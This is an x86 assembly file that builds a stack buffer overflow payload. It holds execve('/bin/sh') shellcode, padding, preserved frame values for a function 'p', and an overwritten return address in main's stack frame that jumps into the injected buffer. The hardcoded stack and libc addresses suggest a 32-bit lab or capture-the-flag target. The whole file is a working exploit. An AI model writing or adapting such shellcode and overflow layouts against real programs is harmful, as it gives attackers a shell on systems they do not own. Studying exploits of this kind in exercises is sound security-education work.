        .intel_syntax noprefix

        // "/bin/sh" in libc
        .set binsh,      0xb7f8cc58
        .set NULL,       0x00000000
        .set SYS_execve, 0xb
        // start of stack buffer in program
        .set buffer,     0xbffffdfc
        .set saved_ebp,  0xbffffe58
        .set saved_eip,  0x0804854a

        .section .rodata

payload_start:
        // execve("/bin/sh", {"/bin/sh", NULL}, NULL)
        mov eax, SYS_execve
        mov ebx, binsh
        mov ecx, buffer + (payload_end - payload_start)
        mov edx, NULL
        int 0x80

payload_end:
        .int binsh
        .int NULL

shellcode_end:
        // padding
        .rept 76 - (shellcode_end - payload_start)
        .byte 0xff
        .endr

        // don't modify p's stack frame...

        // p's stack frame ebp
        .int saved_ebp
        // p's stack frame eip
        .int saved_eip

        // stack alignment, any 8 bytes is fine
        .rept 8
        .byte 0x41
        .endr

        // ... modify main's stack frame instead

        // main's stack frame ebp
        .int NULL
        // main's stack frame eip
        .int buffer
